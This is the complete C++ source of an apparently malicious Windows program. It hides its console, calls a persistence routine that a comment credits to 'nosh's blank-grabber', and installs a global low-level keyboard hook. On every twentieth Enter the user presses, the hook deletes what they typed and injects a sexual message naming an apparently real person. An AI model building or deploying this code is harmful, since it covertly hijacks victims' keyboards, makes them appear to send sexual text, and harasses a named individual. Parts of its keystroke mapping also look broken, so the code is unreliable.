using namespace std;

#include "Nosh.h"
#include <windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <locale>
#include <codecvt>

#define keydown 0
#define keyup KEYEVENTF_KEYUP

HHOOK hookHandle;
int msgcounter = 0;
bool DelayInjectKeystroke = false;

void inject(BYTE vk, DWORD flags)
{
    keybd_event(vk, 0, flags, 0);
}

void message(std::string str)
{
    for (size_t i = 0; i < str.length(); i++)
    {
        if (str[i] == 0x20)
        {
            inject(VK_SPACE, keydown);
            inject(VK_SPACE, keyup);
        }
        else if (str[i] == 0x40)
        {
            inject(VK_SHIFT, keydown);
            inject(0x32, keydown);
            inject(0x32, keydown);
            inject(VK_SHIFT, keyup);
        }
        else
        {
            int vk = str[i] - 0x20;

            inject(vk, keydown);
            inject(vk, keyup);
        }
    }

    //inject(VK_RETURN, keydown);
    //inject(VK_RETURN, keyup);
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) 
    {
        KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN && pKeyboardStruct->vkCode == VK_RETURN && pKeyboardStruct->flags != LLKHF_INJECTED)
        {
            msgcounter++;
            if (msgcounter == 20)
            {
                msgcounter = 0;

                inject(VK_CONTROL, keydown);
                for (size_t i = 0; i < 30; i++)
                {
                    inject(VK_BACK, keydown);
                    inject(VK_BACK, keyup);
                }
                inject(VK_CONTROL, keyup);

                // inject message that we want :)
                std::string str = "i want to do something naughty with chloe chun";
                message(str);
            }
        }
    }

    return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}

void SetupHook()
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);

    if (!hookHandle) {
        std::cerr << "Failed to install hook!" << std::endl;
        exit(0xdead);
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hookHandle);
}




void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
    return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

int main()
{
    HideConsole();

    // persistance (filepath by nosh's blank-grabber)
    Persistence();

    // sets up and maintains hook with a seperate thread so that it does not interrupt main() with the while loop
    std::thread HookThread(SetupHook);

    for (;;)
    {
        // just do whatever u want here idk

        Sleep(1);
    }

    return 0;
}